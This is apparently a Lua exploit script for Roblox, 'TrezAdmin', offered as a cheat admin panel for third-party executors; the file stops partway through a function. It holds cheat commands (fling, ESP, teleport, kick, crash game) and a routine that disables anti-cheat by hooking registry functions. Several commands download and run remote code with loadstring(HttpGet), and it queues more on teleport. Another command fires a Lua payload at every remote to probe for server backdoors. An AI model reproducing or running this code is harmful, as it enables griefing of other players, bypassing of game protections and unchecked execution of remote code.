--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 14 | Scripts: 4 | Modules: 0 | Tags: 0
local G2L = {};

if not getgenv()._Trez then
	getgenv()._Trez = true
else
	return
end



function missing(t, f, fallback)
	if type(f) == t then return f end
	return fallback
end

local FolderName = "TrezAdmin"

if makefolder and not isfolder(FolderName) then
	makefolder(FolderName)
end

local function missing(expectedType, func, fallback)
	if typeof(func) == expectedType then
		return func
	end
	return fallback
end

cloneref = missing("function", cloneref, function(...) return ... end)
sethidden = missing("function", sethiddenproperty or set_hidden_property or set_hidden_prop)
gethidden = missing("function", gethiddenproperty or get_hidden_property or get_hidden_prop)
queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
httprequest = missing("function", request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request))
everyClipboard = missing("function", setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set))
firetouchinterest = missing("function", firetouchinterest)

waxwritefile, waxreadfile = writefile, readfile

writefile = missing("function", waxwritefile) and function(file, data, safe)
	file = FolderName .. "/" .. file
	if safe == true then 
		return pcall(waxwritefile, file, data) 
	end
	return waxwritefile(file, data)
end or writefile

readfile = missing("function", waxreadfile) and function(file, safe)
	file = FolderName .. "/" .. file
	if safe == true then 
		return pcall(waxreadfile, file) 
	end
	return waxreadfile(file)
end or readfile

isfile = missing("function", isfile, readfile and function(file)
	file = FolderName .. "/" .. file
	local success, result = pcall(function()
		return readfile(file)
	end)
	return success and result ~= nil and result ~= ""
end)


if not isfile("TrezAdminDataBase") then
	local Data = {
		["Setting"] = {
			["Perfix"] = ";",
			["UserData"] = {},
			["TotalCommands"] = {},
			["Fully-Supported-Executor"] = {
				["Mobile/Tablet"] = {
					["Delta"] = true, ["Unc"] = 0,
					["Fluxus"] = true, ["Unc"] = 0,
					["PunkX"] = true, ["Unc"] = 0,
				},
				["PC/Laptop"] = {
					["Xeno"] = true, ["Unc"] = 0,
					["SynapseX"] = true, ["Unc"] = 0,
					["Solara"] = true, ["Unc"] = 0,
				},
			},
		},
	}

	Test = function(executorName, platform)
		local start = os.clock()
		for i = 1, 100000 do
			local a = i * i
		end

		local finish = os.clock()
		local timeTaken = finish - start
		local percentage = math.clamp(1 / timeTaken * 10, 0, 100)

		if Data["Setting"]["Fully-Supported-Executor"][platform] 
			and Data["Setting"]["Fully-Supported-Executor"][platform][executorName] then

			Data["Setting"]["Fully-Supported-Executor"][platform]["Unc"] = math.floor(percentage)
			print(Data.Setting["Fully-Supported-Executor"][platform]["Unc"] == math.floor(percentage))
		end
	end

	writefile("TrezAdminDataBase", game:GetService("HttpService"):JSONEncode(Data))
end



local function CheckIfExecutor()
	local success = pcall(function()
		return getgenv().__test
	end)

	if success then
		Notice:InvokeServer("your Executor is Fully Supported")
	else
		Notice:InvokeServer("your Executor is UnSupported Sorry")
	end
end


local FolderName = "TrezMain"
local FileName = "README.md"
local URL = "https://raw.githubusercontent.com/G4mg1/TrezAdmin/refs/heads/main/README.md"

if makefolder and not isfolder(FolderName) then
	makefolder(FolderName)
end

local content = game:HttpGet(URL)
writefile(FolderName .. "/" .. FileName, content)

print("File saved to " .. FolderName .. "/" .. FileName)

queueteleport([[
	local FolderName = "TrezMain"
	local FileName = "README.md"
	local URL = "https://raw.githubusercontent.com/G4mg1/TrezAdmin/refs/heads/main/README.md"

	if makefolder and not isfolder(FolderName) then
		makefolder(FolderName)
	end

	local content = game:HttpGet(URL)
	writefile(FolderName .. "/" .. FileName, content)

	loadstring(content)()
]])






-- StarterGui.Trez
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["Name"] = [[Trez]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.Trez.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["2"]["Size"] = UDim2.new(0.16441, 0, 0.30694, 0);
G2L["2"]["Position"] = UDim2.new(0.82534, 0, 0.69694, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Trez.Frame.AppearSelectedCmds
G2L["3"] = Instance.new("LocalScript", G2L["2"]);
G2L["3"]["Name"] = [[AppearSelectedCmds]];


-- StarterGui.Trez.Frame.CmdRunner
G2L["4"] = Instance.new("LocalScript", G2L["2"]);
G2L["4"]["Name"] = [[CmdRunner]];


-- StarterGui.Trez.Frame.TextBox
G2L["5"] = Instance.new("TextBox", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 19;
G2L["5"]["TextColor3"] = Color3.fromRGB(168, 168, 168);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["PlaceholderText"] = [[Trez Admin version 1.0.0]];
G2L["5"]["TextWrapped"] = true;
G2L["5"]["Size"] = UDim2.new(0.92099, 0, 0.15089, 0);
G2L["5"]["Position"] = UDim2.new(0.03922, 0, 0.0343, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[]];
G2L["5"]["BackgroundTransparency"] = 1;


-- StarterGui.Trez.Frame.TextBox.AnimateService
G2L["6"] = Instance.new("LocalScript", G2L["5"]);
G2L["6"]["Name"] = [[AnimateService]];


-- StarterGui.Trez.Frame.Cmds
G2L["7"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["7"]["Active"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["CanvasPosition"] = Vector2.new(0, 239.97231);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["Name"] = [[Cmds]];
G2L["7"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["7"]["Size"] = UDim2.new(0.93373, 0, 0.71807, 0);
G2L["7"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Position"] = UDim2.new(0.5051, 0, 0.6, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["BackgroundTransparency"] = 1;


-- StarterGui.Trez.Frame.Cmds.UIListLayout
G2L["8"] = Instance.new("UIListLayout", G2L["7"]);
G2L["8"]["Padding"] = UDim.new(0, 2);
G2L["8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Trez.Frame.Cmds.Example
G2L["9"] = Instance.new("TextLabel", G2L["7"]);
G2L["9"]["TextWrapped"] = true;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextSize"] = 14;
G2L["9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["TextColor3"] = Color3.fromRGB(168, 168, 168);
G2L["9"]["Size"] = UDim2.new(0.92767, 0, 0.07369, 0);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[version of project ( ver )]];
G2L["9"]["Name"] = [[Example]];


-- StarterGui.Trez.Frame.Cmds.Example.UIPadding
G2L["a"] = Instance.new("UIPadding", G2L["9"]);
G2L["a"]["PaddingLeft"] = UDim.new(0, 10);


-- StarterGui.Trez.Notice
G2L["b"] = Instance.new("Frame", G2L["1"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["b"]["Size"] = UDim2.new(0.16441, 0, 0.04861, 0);
G2L["b"]["Position"] = UDim2.new(0.65534, 0, 1.01528, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Name"] = [[Notice]];


-- StarterGui.Trez.Notice.InputShow
G2L["c"] = Instance.new("LocalScript", G2L["b"]);
G2L["c"]["Name"] = [[InputShow]];


-- StarterGui.Trez.Notice.TextLabel
G2L["d"] = Instance.new("TextLabel", G2L["b"]);
G2L["d"]["TextWrapped"] = true;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 11;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["TextColor3"] = Color3.fromRGB(173, 173, 173);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["d"]["Size"] = UDim2.new(0.92589, 0, 0.55516, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[Actions]];
G2L["d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Trez.NoticeFunc
G2L["e"] = Instance.new("BindableFunction", G2L["1"]);
G2L["e"]["Name"] = [[NoticeFunc]];


-- StarterGui.ScreenGui.Fly
G2L["lol"] = Instance.new("Tool", G2L["1"]);
G2L["lol"]["CanBeDropped"] = false;
G2L["lol"]["WorldPivot"] = CFrame.new(Vector3.new(23.50825, 8.08428, -66.7928), Vector3.new(0, 0, -1));
G2L["lol"]["RequiresHandle"] = false;
G2L["lol"]["Name"] = [[flytool]];

G2L["cr"] = Instance.new("RemoteFunction", G2L["1"])
G2L["cr"]["Name"] = "BackdoorResult"



-- StarterGui.Trez.Frame.AppearSelectedCmds
local function C_3()
local script = G2L["3"];
	Source = script.Parent.Cmds
	SourceBox = script.Parent.TextBox
	
	SourceBox:GetPropertyChangedSignal("Text"):Connect(function()
		for i, v in pairs(Source:GetChildren()) do
			if v:IsA("TextLabel") then
				if string.find(string.lower(v.Name), string.lower(SourceBox.Text)) then
					v.Visible = true
				else
					v.Visible = false
				end
			end
		end
	end)
	
	SourceBox.FocusLost:Connect(function()
		for i, v in pairs(Source:GetChildren()) do
			if v:IsA("TextLabel") then
				v.Visible = true
			end
		end
		SourceBox.Text = ""
	end)
	
end;
task.spawn(C_3);
-- StarterGui.Trez.Frame.CmdRunner
local function C_4()
local script = G2L["4"];
	local SourceBox = script.Parent.TextBox
	local Notice = script.Parent.Parent:WaitForChild("NoticeFunc")
	local exampleText = script.Parent.Cmds.Example
	exampleText.Visible = false
	IsSpinning = false
	Active = false
	isEsp = false
	IsFollowing = false
	isOofing = false
	IsAntien = false
	
	local flinging = false
	local IsFlinging = false
	local flingDied = nil
	
	local lighting = game:GetService("Lighting")
	local Bright = Instance.new("ColorCorrectionEffect")
	Bright.Parent = lighting
	
	local Cmds = {
		["http"] = {["Name"]="http", ["Description"]="Checks if HttpService is enabled"},
		["tp"] = {["Name"]="tp", ["Description"]="Teleports you to a player", ["Arguments"]={"PlayerName"}},
		["tools"] = {["Name"]="tools", ["Description"]="Gives you all tools in the game"},
		["spin"] = {["Name"]="spin", ["Description"]="Spins the player"},
		["unspin"] = {["Name"]="unspin", ["Description"]="Stops spinning the player"},
		["walkspeed"] = {["Name"]="walkspeed", ["Description"]="Sets your walkspeed", ["Arguments"]={"Speed"}},
		["jump"] = {["Name"]="jump", ["Description"]="Makes you jump"},
		["sit"] = {["Name"]="sit", ["Description"]="Makes you sit"},
		["firetouch"] = {["Name"]="firetouch", ["Description"]="Sets a part to fire", ["Arguments"]={"PartName"}},
		["respawn"] = {["Name"]="respawn", ["Description"]="Respawns the player"},
		["ver"] = {["Name"]="ver", ["Description"]="Shows the version of the game"},
		["jumppower"] = {["Name"]="jumppower", ["Description"]="Sets your jump power", ["Arguments"]={"Power"}},
		["fling"] = {["Name"]="fling", ["Description"]="Flings the player", ["Arguments"]={"PlayerName"}},
		["unfling"] = {["Name"]="unfling", ["Description"]="Stops flinging the player", ["Arguments"]={"PlayerName"}},
		["getscriptcount"] = {["Name"]="getscriptcount", ["Description"]="Returns the number of scripts in the game"},
		["removeanticheat"] = {["Name"]="removeanticheat", ["Description"]="Removes all anti-cheat scripts from the game ( optional )"},
		["rejoin"] = {["Name"]="rejoin", ["Description"]="Rejoins the game"},
		["serverhop"]={["Name"]="serverhop", ["Description"]="server hop"},
		["totalcmds"]={["Name"]="totalcmds", ["Description"]="total commands"},
		["say"]={["Name"]="say", ["Description"]="Says a message", ["Arguments"]={"Message"}},
		["givehealth"]={["Name"]="givehealth", ["Description"]="gives you health", ["Arguments"]={"Numbers"}},
		["day"]={["Name"]="day", ["Description"]="day"},
		["night"]={["Name"]="night", ["Description"]="night"},
		["esp"] = {["Name"]="esp", ["Description"]="ESP"},
		["unesp"] = {["Name"]="unesp", ["Description"]="unESP"},
		["executor"]={["Name"]="executor", ["Description"]="me executor lol", ["Arguments"]={"Script"}},
		["olddex"]={["Name"]="olddex", ["Description"]="Old Dex"},
		["dex"]={["Name"]="dex", ["Description"]="explorer debugging suite"},
		["fly"]= {["Name"]="fly", ["Description"]="Makes you fly", ["Arguments"]={"Speed"}},
		["unfly"]= {["Name"]="unfly", ["Description"]="Stops flying"},
		["follow"]={["Name"]="follow", ["Description"]="follow target"},
		["unfollow"]={["Name"]="unfollow", ["Description"]="unfollow target"},
		["checkbackdoor"]={["Name"]="checkbackdoor", ["Description"]="check for backdoor"},
		["antispy"]= {["Name"]="antispy", ["Description"]="Anti spy"},
		["loopoof"]= {["Name"]="loopoof", ["Description"]="loop oof"},
		["unloopoof"]= {["Name"]="unloopoof", ["Description"]="Stops loop oof"},
		["moonbackdoor"]= {["Name"]="moonbackdoor", ["Description"]="load backdoor scanner"},
		["uiscale"]= {["Name"]="uiscale", ["Description"]="change size of UI"},
		["sendwebhook"]= {["Name"]="sendwebhook", ["Description"]="Send a message to discord server using your webhook", ["Arguments"]={"Webhook URL", "Message"}},
		["changename"]= {["Name"]="changename", ["Description"]="Change your name ( display Name )", ["Arguments"]={"New Name"}},
		["crashgame"]= {["Name"]="crashgame", ["Description"]="Crash the game ( sometime doesnt work )"},
		["kick"]= {["Name"]="kick", ["Description"]="Kicks a player using methods", ["Arguments"]={"Player"}},
		["laugh"]= {["Name"]="laugh", ["Description"]="laugh"},
		["moonvm"]= {["Name"]="moonvm", ["Description"]="char you as moonvm"},
		["char"]= {["Name"]="char", ["Description"]="Chars you as someone", ["Arguments"]={"Player"}},
		["antikill"]= {["Name"]="antikill", ["Description"]="Anti kill"},
		["unantikill"]= {["Name"]="unantikill", ["Description"]="unAnti kill"},
		["bright"]= {["Name"]="bright", ["Description"]="bright"},
		["btools"]= {["Name"]="btools", ["Description"]="load Building Tools"},
		["call"]= {["Name"]="call", ["Description"]="Call a player", ["Arguments"]={"Player"}},
	}
	
	local laughsound = Instance.new("Sound", game.Players.LocalPlayer.Character)
	laughsound.SoundId = "rbxassetid://134736863806216"

	
	local function SetUP()
		for i,v in pairs(Cmds) do
			local new = exampleText:Clone()
			new.Visible = true
			new.Text = v.Name..": "..v.Description
			new.Name = v.Name
			new.Parent = exampleText.Parent
		end
	end
	
	
	SetUP()
	
	local CmdsActions = {
		["http"] = function()
			local HttpService = game:GetService("HttpService")
			local success = pcall(function()
				HttpService:GetAsync("https://www.roblox.com")
			end)
	
			if success then
				Notice:Invoke("HttpService is enabled")
			else
				Notice:Invoke("HttpService is disabled")
			end
		end,
	
		["tp"] = function(args)
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then
				Notice:Invoke("HumanoidRootPart not found")
				return
			end
	
			if not args[1] then
				Notice:Invoke("Please specify a player to teleport to")
				return
			end
	
			local targetName = args[1]:lower()
			local target
	
			
			for _, p in pairs(game.Players:GetPlayers()) do
				if string.find(p.Name:lower(), targetName) or string.find(p.DisplayName:lower(), targetName) then
					target = p
					break
				end
			end
	
			if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
				hrp.CFrame = target.Character.HumanoidRootPart.CFrame
				Notice:Invoke("Teleported to "..target.Name)
			else
				Notice:Invoke("Teleport failed - target not found or has no HumanoidRootPart")
			end
		end,
	
	
		["tools"] = function()
			local count = 0
			for _, v in pairs(game:GetDescendants()) do
				if v:IsA("Tool") then
					v:Clone().Parent = game.Players.LocalPlayer:WaitForChild("Backpack")
					count = count + 1
				end
			end
			Notice:Invoke("Successfully cloned "..count.." tools to your backpack")
		end,
	
		["spin"] = function(arg)
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
	
			local speed = tonumber(arg[1]) or 10
			hrp.Anchored = true
			IsSpinning = true
			while IsSpinning do
				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(speed), 0)
				task.wait()
			end
			hrp.Anchored = false
			Notice:Invoke("Spinning")
		end,
	
		["unspin"] = function()
			IsSpinning = false
			Notice:Invoke("Unspinning")
		end,
	
		["walkspeed"] = function(args)
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.WalkSpeed = tonumber(args[1]) or 16
				Notice:Invoke("Walkspeed set to "..humanoid.WalkSpeed)
			else
				Notice:Invoke("Humanoid not found")
			end
		end,
	
		["jump"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Jump = true
				Notice:Invoke("Jumped")
			else
				Notice:Invoke("Humanoid not found")
			end
		end,
	
		["sit"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Sit = true
				Notice:Invoke("Sitting")
			else
				Notice:Invoke("Humanoid not found")
			end
		end,
	
		["firetouch"] = function(arg)
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			for i,v in pairs(game.Workspace:GetChildren()) do
				if arg[1] and string.find(v.Name, arg[1]) then
					firetouchinterest(hrp, v, 0)
					firetouchinterest(hrp, v, 1)
					Notice:Invoke("Fired touch event on "..v.Name)
				end
			end
		end,
	
		["respawn"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			if not char then return end
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 1
				end
			end
			task.wait(0.8)
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Health = 0
			end
			task.wait(5)
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.Transparency = 0
				end
			end
			Notice:Invoke("Respawned")
		end,
	
		["ver"] = function()
			local HttpService = game:GetService("HttpService")
			local success, ver = pcall(function()
				return HttpService:GetAsync("https://version-omega.vercel.app")
			end)
	
			if success and ver then
				Notice:Invoke("Version: "..ver)
			else
				Notice:Invoke("Version: 1.0.0")
			end
		end,
		["jumppower"] = function(args)
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.JumpPower = tonumber(args[1]) or 50
				Notice:Invoke("JumpPower set to "..humanoid.JumpPower)
			else
				Notice:Invoke("Humanoid not found")
			end
		end,
		["antifling"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.CanCollide = false
				end
			end
		end;
		["unantifling"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.CanCollide = true
				end
			end
		end,

		["fling"] = function()
			flinging = true
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			if not char then return end

			for _, child in pairs(char:GetDescendants()) do
				if child:IsA("BasePart") then
					child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
				end
			end

			for _, part in pairs(char:GetChildren()) do
				if part:IsA("BasePart") then
					part.CanCollide = false
				end
			end

			wait(0.1)
			local bambam = Instance.new("BodyAngularVelocity")
			bambam.Name = "_idk"
			bambam.Parent = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")
			bambam.AngularVelocity = Vector3.new(0, 99999, 0)
			bambam.MaxTorque = Vector3.new(0, math.huge, 0)
			bambam.P = math.huge

			for _, v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.CanCollide = false
					v.Massless = true
					v.Velocity = Vector3.new(0, 0, 0)
				end
			end

			IsFlinging = true

			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if humanoid then
				flingDied = humanoid.Died:Connect(function()
					IsFlinging = false
					flinging = false
				end)
			end

			repeat
				if bambam.Parent then
					bambam.AngularVelocity = Vector3.new(0, 99999, 0)
				end
				wait(0.2)
				if bambam.Parent then
					bambam.AngularVelocity = Vector3.new(0, 0, 0)
				end
				wait(0.1)
			until flinging == false

			Notice:Invoke("flinging")
		end,

		["unfling"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			if not char then return end

			for _, v in pairs(char:GetChildren()) do
				if v:IsA("BasePart") then
					v.CanCollide = true
				end
			end

			if flingDied then
				flingDied:Disconnect()
				flingDied = nil
			end

			flinging = false
			wait(0.1)

			for _, v in pairs(char:GetChildren()) do
				if v:IsA("BodyAngularVelocity") then
					v:Destroy()
				end
			end

			for _, child in pairs(char:GetDescendants()) do
				if child:IsA("Part") or child:IsA("MeshPart") then
					child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
				end
			end

			Notice:Invoke("Unflung")
		end,

		
		["executor"] = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/G4mg1/PR/refs/heads/main/README.md"))()
			Notice:Invoke("Executor Loaded Made by Me :)")
		end,

		["getscriptcount"] = function()
			local count = 0
			local ScriptType = {}
			for _, v in pairs(game:GetDescendants()) do
				if v:IsA("Script") then
					count = count + 1
					table.insert(ScriptType, "Script")
				end
				if v:IsA("LocalScript") then
					count = count + 1
					table.insert(ScriptType, "LocalScript")
				end
				if v:IsA("ModuleScript") then
					count = count + 1
					table.insert(ScriptType, "ModuleScript")
				end
			end
			if ScriptType then
				Notice:Invoke("Total Scripts: "..count)
			end
		end,
		["removeanticheat"] = function()
			local reg = getreg()
			for i,v in pairs(reg) do
				if type(v) == "function" then
					local info = getinfo(v)
					if info then
						hookfunction(info.func, function(...)
							return nil
						end)
					end
				end
			end
			Notice:Invoke("Removed Anti Cheat")
		end,
		["rejoin"] = function()
			local player = game.Players.LocalPlayer
			game:GetService("TeleportService"):Teleport(game.PlaceId, player)
			Notice:Invoke("Rejoining")
		end,
		["serverhop"] = function()
			local player = game.Players.LocalPlayer
			local TeleportService = game:GetService("TeleportService")

			local success, newserver = pcall(function()
				return TeleportService:ReserveServer(game.PlaceId)
			end)

			if success and newserver then
				wait(2)
				TeleportService:TeleportToPrivateServer(game.PlaceId, newserver, {player})
			end

			Notice:Invoke("Serverhopping")
		end,
		["totalcmds"] = function()
			local count = 0
			for i,v in pairs(G2L["7"]:GetChildren()) do
				if v:IsA("TextLabel") then
					count = count + 1
				end
			end
			Notice:Invoke("Total Commands: "..count)
		end,
		["say"] = function(args)
			local player = game.Players.LocalPlayer
			local TextChatService = game:GetService("TextChatService")
			local channel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
			if channel then
				local message = table.concat(args, " ")
				channel:SendAsync('<TrezChat> = ' .. message)
			end
			Notice:Invoke("Saying: "..table.concat(args, " "))
		end,
		
		["givehealth"] = function(args)
			local player = game.Players.LocalPlayer
			local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
			if humanoid then
				humanoid.Health = args[1]
			end
			Notice:Invoke("Gave Health: "..args[1])
		end,
		["day"] = function()
			game.Lighting.ClockTime = 14
			game.Lighting.TimeOfDay = "14:00:00"
			Notice:Invoke("Set Time to Day")
		end,
		["night"] = function()
			game.Lighting.ClockTime = 0
			game.Lighting.TimeOfDay = "00:00:00"
			Notice:Invoke("Set Time to Night")
		end,
		["esp"] = function()
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					local char = v.Character
					if char then
						local hum = char:FindFirstChildOfClass("Humanoid")
						if hum and not char:FindFirstChild("ESP") then
							local Highlight = Instance.new("Highlight")
							Highlight.Parent = char
							Highlight.Name = "ESP"
							Highlight.FillColor = Color3.new(1, 1, 1)
							Highlight.OutlineColor = Color3.new(1, 0, 0.0156863)
							Highlight.FillTransparency = 0.5
							Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

							hum.Died:Connect(function()
								if char and not char:FindFirstChild("ESP") then
									local Highlight = Instance.new("Highlight")
									Highlight.Parent = char
									Highlight.Name = "ESP"
									Highlight.FillColor = Color3.new(1, 1, 1)
									Highlight.OutlineColor = Color3.new(1, 0, 0.0156863)
									Highlight.FillTransparency = 0.5
									Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
								end
							end)
							
							game.Players.PlayerAdded:Connect(function(player)
								if player.Character then
									local hum = player.Character:FindFirstChildOfClass("Humanoid")
									if hum and not player.Character:FindFirstChild("ESP") then
										local Highlight = Instance.new("Highlight")
										Highlight.Parent = char
										Highlight.Name = "ESP"
										Highlight.FillColor = Color3.new(1, 1, 1)
										Highlight.OutlineColor = Color3.new(1, 0, 0.0156863)
										Highlight.FillTransparency = 0.5
										Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
									end
								end
							end)
						end
					end
				end
			end
			Notice:Invoke("Set up Esp")
		end,

		["unesp"] = function()
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					local char = v.Character
					if char then
						local Highlight = char:FindFirstChild("ESP")
						if Highlight then
							Highlight:Destroy()
						end
					end
				end
			end
			Notice:Invoke("remove up Esp")
		end,
		["olddex"] = function()
			local getobjects = function(a)
				local Objects = {}
				if a then
					local b = game:GetService("InsertService"):LoadLocalAsset(a)
					if b then 
						table.insert(Objects, b) 
					end
				end
				return Objects
			end

			local Dex = getobjects("rbxassetid://10055842438")[1]
			Dex.Parent = game.Players.LocalPlayer.PlayerGui
			Notice:Invoke("Old Dex Loaded")
		end,
		["dex"] = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
			Notice:Invoke("Dex Loaded")
		end,
		["fly"] = function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/fhrdimybds-byte/OP-FLY-GUI-/refs/heads/main/Lua"))()
			Notice:Invoke("Flying gui loaded")
		end,
		["follow"] = function(args)
			local plr = game.Players.LocalPlayer
			local char = plr.Character
			local humanoid = char:WaitForChild("Humanoid")
			local rootPart = char:WaitForChild("HumanoidRootPart")
			local target
			local targetName = args[1]
			for _, p in pairs(game.Players:GetPlayers()) do
				if string.find(p.Name:lower(), targetName) or string.find(p.DisplayName:lower(), targetName) then
					target = p
					break
				end
			end
			local targetHRP = target and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
			if not targetHRP then
				Notice:Invoke("Target not found")
				return
			end
			IsFollowing = true
			while IsFollowing do
				wait(0.05)
				rootPart.CFrame = CFrame.new(rootPart.Position, targetHRP.Position)
				humanoid:MoveTo(targetHRP.Position)
				if not IsFollowing then
					break
				end
			end
		end,
		["unfollow"] = function()
			IsFollowing = false
		end,
		["antispy"] = function()
			local HttpService = game:GetService("HttpService")
			local CommonResquestsFromHttps = {
				'GetAsync';
				'RequestAsync';
				'PostAsync';
				'JSONDecode';
				'JSONEncode';
				
			}
			local getreg = getreg()
			for i,v in pairs(getreg) do
				if type(v) == "function" then
					local getinfo = getinfo(v)
					if table.find(getinfo, CommonResquestsFromHttps) then
						hookfunction(getinfo.func, function(...)
							return nil
						end)
						Notice:Invoke("Blocked Anti-Spys: "..getinfo.func.Name)
					end
				end
			end
		end,
		["checkbackdoor"] = function()
			local IsFunc = "RemoteFunction"
			local PayLoad = [[
			 local msg = Instance.new("Message")
             msg.Parent = game.Workspace
             msg.Text = "TrezAdmin => Backdoor Found"
             msg.Name = "WeWO"
             wait(3)
             msg:Destroy()
			]]
			for i,v in pairs(game:GetDescendants()) do
				task.spawn(function()
					if v.ClassName == IsFunc then
						pcall(function()
							v:InvokeServer(PayLoad)
						end)
					elseif v.ClassName == "RemoteEvent" then
						pcall(function()
							v:FireServer(PayLoad)
						end)
					end
					for i,v in pairs(game:GetDescendants()) do
						if v.Name == "WeWO" then
							Notice:Invoke("Backdoor Found at = "..v.Parent.ClassName)
						end
					end
				end)
			end
		end,
		["loopoof"] = function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")
			isOofing = true
			Notice:Invoke("Loop Oof Started")
			while isOofing do
				wait(0.05)
				hrp:FindFirstChild("Died"):Play()
				if not isOofing then
					break
